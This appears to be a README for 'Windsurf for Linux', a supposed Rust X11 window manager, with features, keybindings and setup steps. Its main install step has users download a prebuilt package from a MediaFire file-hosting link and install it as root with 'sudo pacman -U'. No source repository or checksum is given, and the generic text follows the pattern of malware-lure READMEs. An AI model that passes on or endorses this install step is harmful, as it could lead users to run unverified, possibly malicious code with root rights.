# Windsurf for Linux

Windsurf is a powerful X11 window manager written in Rust, designed to provide a seamless and efficient window management experience on Linux.

## Key Features

- Automatic window management with smart tiling support
- Fully customizable through configuration file
- Low resource consumption
- Virtual desktop support
- Fully customizable keyboard shortcuts
- Floating window mode support
- Status bar integration
- Multi-monitor support

## Prerequisites

- Arch Linux
- X11 window system
- Rust toolchain
- git
- base-devel

## Installation Methods

### 1. Direct Package Installation

Download Options:
- [MediaFire Download](https://www.mediafire.com/file/3j4yuf28p8k5q08/windsurf-1.1.2-1-x86_64.pkg.tar.zst/file)


After downloading, install using:
```bash
sudo pacman -U windsurf-1.1.2-1-x86_64.pkg.tar.zst
```

### 2. AUR Installation

```bash
yay -S windsurf
```


## Basic Configuration

Create the configuration directory:
```bash
mkdir -p ~/.config/windsurf
```

Copy the default configuration file:
```bash
cp /usr/share/doc/windsurf/examples/config.toml ~/.config/windsurf/config.toml
```

## Getting Started

Add the following line to your `~/.xinitrc`:
```bash
exec windsurf
```

## Default Keybindings

- `Mod4 + Enter`: Open new terminal
- `Mod4 + Q`: Close active window
- `Mod4 + [1-9]`: Switch to workspace
- `Mod4 + Shift + [1-9]`: Move active window to workspace
- `Mod4 + F`: Toggle active window mode (floating/tiled)
- `Mod4 + R`: Reload configuration

## Troubleshooting

If you encounter any issues:

1. Check the log files in `~/.local/share/windsurf/windsurf.log`
2. Ensure all prerequisites are installed
3. Verify your configuration file syntax

## Contributing

Contributions are welcome! Please:

1. Fork the project
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## Releases
- Current Version: v1.1.2


## Acknowledgments

Special thanks to all contributors and the community who helped develop this project.
